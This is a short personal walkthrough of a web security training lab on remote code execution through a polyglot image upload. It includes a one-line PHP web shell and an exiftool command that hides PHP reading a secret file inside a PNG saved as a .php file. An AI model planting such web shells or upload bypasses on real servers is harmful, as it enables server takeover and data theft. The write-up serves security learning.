>> Lab: Remote code execution via polyglot web shell upload

---
**Vuln**
-  This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code. 

**Goal**
-  upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner. 

**Creds**
- `wiener:peter`

---

### Steps:
1. Open The Lab And Login With creds ...
   
2. simplly try to upload php payload file 
   ```php
   <?php echo shell_exec($_GET['cmd']); ?>
   ```
   - but lab block this request
   - ![php file upload]({4B989888-BEE1-461D-842A-683E6A3BCA75}.png)

3. so i will try to some bypass techniques 
   - so is uploaded 
   - ![alt text]({BA23462B-77D0-480A-AF76-E3CC4943C7D4}.png)
   - and render in browser 
   - but i think cmd not execute 
   - ![alt text]({534BAF11-9A74-41E2-8BE8-525A72D6C0AA}.png)
  
4. and Try Polyglot technique 
   - make polyglot any png/jpg file with exif tool
   - ![exiftool]({F2BB385C-2A38-4AAC-B344-D433CFBEB99B}.png)
  ```Tool command
      - exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" cat.png -o polyglot.php
  ```
  - upload polyglot.php file
  - ![alt text]({23CD3FA0-F5D7-4362-ADA6-29901DCBDCFC}.png)
  - and this is successfully uploaded
  - ![alt text]({0B7B6E3F-E385-4D34-96D6-A6097682189A}.png)
  - back to account 
  - and right click on avatar open in new tab 
  - and our key is 
  - ![alt text]({AD949E38-BC83-44AA-91A0-BCDB50B82B1A}.png)
5. Submit key and solve the lab successfully
   - ![solve]({F273E053-5807-493A-BDCD-A990B0A386A1}.png)
